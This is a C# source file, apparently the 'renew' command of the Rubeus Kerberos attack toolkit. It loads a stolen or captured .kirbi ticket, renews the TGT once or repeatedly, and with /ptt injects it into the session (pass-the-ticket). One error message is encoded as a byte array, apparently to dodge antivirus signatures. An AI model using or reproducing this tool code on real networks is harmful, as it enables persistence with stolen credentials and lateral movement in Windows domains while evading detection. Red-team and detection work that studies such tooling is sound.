using System;
using System.Collections.Generic;
using System.IO;


namespace Rubeus.Commands
{
    public class RenewCommand : ICommand
    {
        public static string CommandName => "renew";

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
            string outfile = "";
            bool ptt = false;
            string dc = "";

            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }

            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }

            if (arguments.ContainsKey("/ticket"))
            {
                string kirbi64 = arguments["/ticket"];
                byte[] kirbiBytes = null;

                if (Helpers.IsBase64String(kirbi64))
                {
                    kirbiBytes = Convert.FromBase64String(kirbi64);
                }
                else if (File.Exists(kirbi64))
                {
                    kirbiBytes = File.ReadAllBytes(kirbi64);
                }

                if(kirbiBytes == null)
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                }
                else
                {
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    if (arguments.ContainsKey("/autorenew"))
                    {
                        Console.WriteLine("[*] Action: Auto-Renew Ticket\r\n");
                        // if we want to auto-renew the TGT up until the renewal limit
                        Renew.TGTAutoRenew(kirbi, dc);
                    }
                    else
                    {
                        Console.WriteLine("[*] Action: Renew Ticket\r\n");
                        // otherwise a single renew operation
                        byte[] blah = Renew.TGT(kirbi, outfile, ptt, dc);
                    }
                }

                return;
            }
            else
            {
                Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied!\r\n");
                return;
            }
        }
    }
}